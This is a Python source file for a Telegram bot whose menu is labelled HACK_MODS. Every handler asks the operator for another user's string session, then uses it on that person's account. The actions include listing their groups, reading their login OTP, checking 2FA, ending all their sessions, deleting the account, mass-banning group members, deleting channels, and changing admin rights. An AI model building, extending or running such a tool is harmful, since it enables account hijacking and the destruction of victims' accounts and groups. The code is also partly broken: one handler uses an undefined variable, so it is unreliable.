import os
from TaitanX import app,API_ID,API_HASH
from pyrogram import filters , Client
from TaitanX.Helpers.steve import (
    users_gc,
    user_info,
    banall,
    get_otp,
    join_ch,
    leave_ch,
    del_ch,
    check_2fa,
    terminate_all,
    del_acc,
    piromote,
    demote_all)
from TaitanX.Helpers.data import HACK_MODS 
from pyrogram.types import CallbackQuery 
from pyrogram.raw import functions
from telethon import TelegramClient 
from telethon.sessions import StringSession 



@app.on_callback_query(filters.regex("A"))
async def a_callback(client : Client , query : CallbackQuery):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ ᴏꜰ ᴛʜᴀᴛ ᴜꜱᴇʀ")    
    ch = await users_gc(session.text)
    if len(ch) > 3855:
        file = open("session.txt", "w")
        file.write(ch)
        file.close()
        await client.send_document(chat_id, "session.txt")
        os.system("rm -rf session.txt")
    else:
        await query.message.reply_text(text = ch + "\n\n**ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱᴇɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

    
@app.on_callback_query(filters.regex("B"))
async def b_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ ᴏꜰ ᴛʜᴀᴛ ᴜꜱᴇʀ.")
    info = await user_info(session.text)
    await query.message.reply_text(text = info + "\n\n**ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱᴇɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("C"))
async def c_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ ᴏꜰ ᴛʜᴀᴛ ᴜꜱᴇʀ.")
    gc = await client.ask(id,"𝐍𝐎𝐖 𝐆𝐈𝐕𝐄 𝐌𝐄 𝐓𝐇𝐄 𝐆𝐑𝐎𝐔𝐏/𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐈𝐃 𝐎𝐑 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄") 
    hehe = await banall(session.text,gc)
    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱᴇɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("D"))
async def d_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ ᴏꜰ ᴛʜᴀᴛ ᴜꜱᴇʀ.")
    hehe = await get_otp(session.text)
    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱᴇɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("E"))
async def e_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ ᴏꜰ ᴛʜᴀᴛ ᴜꜱᴇʀ.")
    gc = await client.ask(id,"𝐍𝐎𝐖 𝐆𝐈𝐕𝐄 𝐌𝐄 𝐓𝐇𝐄 𝐆𝐑𝐎𝐔𝐏/𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐈𝐃 𝐎𝐑 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄") 
    hehe = await join_ch(session.text,gc)
    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱᴇɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("F"))
async def f_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ ᴏꜰ ᴛʜᴀᴛ ᴜꜱᴇʀ.")
    gc = await client.ask(id,"𝐍𝐎𝐖 𝐆𝐈𝐕𝐄 𝐌𝐄 𝐓𝐇𝐄 𝐆𝐑𝐎𝐔𝐏/𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐈𝐃 𝐎𝐑 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄") 
    hehe = await leave_ch(session.text,gc)
    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱᴇɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("G"))
async def g_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ ᴏꜰ ᴛʜᴀᴛ ᴜꜱᴇʀ.")
    gc = await client.ask(id,"𝐍𝐎𝐖 𝐆𝐈𝐕𝐄 𝐌𝐄 𝐓𝐇𝐄 𝐆𝐑𝐎𝐔𝐏/𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐈𝐃 𝐎𝐑 𝐔𝐒𝐄𝐑𝐍𝐀𝐌𝐄") 
    hehe = await del_ch(session.text,gc)
    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱᴇɪɴɢ ᴍᴇ**",
            disable_web_page_preview=True)


@app.on_callback_query(filters.regex("H"))
async def h_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ ᴏꜰ ᴛʜᴀᴛ ᴜꜱᴇʀ.")
    hehe = await check_2fa(session.text)
    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱᴇɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("I"))
async def i_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ ᴏꜰ ᴛʜᴀᴛ ᴜꜱᴇʀ.")
    hehe = await terminate_all(session.text)
    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱᴇɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("J"))
async def j_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ ᴏꜰ ᴛʜᴀᴛ ᴜꜱᴇʀ.")    
    hehe = await del_acc(session.text)
    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱᴇɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("K"))
async def k_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ꜱʏʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ.")    
    user_id = await client.ask(id,"ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ᴜꜱᴇʀ ɪᴅ/ᴜꜱᴇʀɴᴀᴍᴇ ᴡʜᴏᴍ ɪ ᴡɪʟʟ ᴘʀᴏᴍᴏᴛᴇ.")
    gc_id = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ ᴜꜱᴇʀɴᴀᴍᴇ ᴡʜᴇʀᴇ ɪ ᴡɪʟʟ ᴘʀᴏᴍᴏᴛᴇ ᴛʜᴀᴛ ᴜꜱᴇʀ.")
    hehe = await piromote(session.text,gc_id,user_id)
    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱᴇɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)

@app.on_callback_query(filters.regex("L"))
async def l_callback(client : Client, query : CallbackQuery):
    id = query.message.chat.id   
    session = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ꜱᴛʀɪɴɢ ꜱᴇꜱꜱɪᴏɴ ᴏꜰ ᴛʜᴀᴛ ᴜꜱᴇʀ.")    
    gc_id = await client.ask(id,"ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ ɢʀᴏᴜᴘ ɪᴅ/ᴜꜱᴇʀɴᴀᴍᴇ ᴡʜᴇʀᴇ ɪ ᴡɪʟʟ ᴅᴇᴍᴏᴛᴇ ᴀʟʟ ᴍᴇᴍʙᴇʀ .")
    hehe = await demote_all(session.text,gc_id,user_id)
    await query.message.reply_text(text = hehe + "\n\n**ᴛʜᴀɴᴋꜱ ꜰᴏʀ ᴜꜱᴇɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS,
            disable_web_page_preview=True)
